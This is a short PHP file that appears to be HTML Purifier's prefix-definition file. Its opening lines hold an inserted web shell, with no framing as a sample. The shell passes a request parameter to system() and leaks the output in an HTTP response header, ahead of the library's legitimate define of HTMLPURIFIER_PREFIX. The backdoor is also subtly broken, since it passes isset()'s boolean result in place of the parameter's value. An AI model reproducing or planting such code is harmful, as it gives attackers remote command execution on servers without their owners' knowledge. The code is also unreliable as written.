<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
if (!defined('HTMLPURIFIER_PREFIX')) {
    define('HTMLPURIFIER_PREFIX', __DIR__);
}
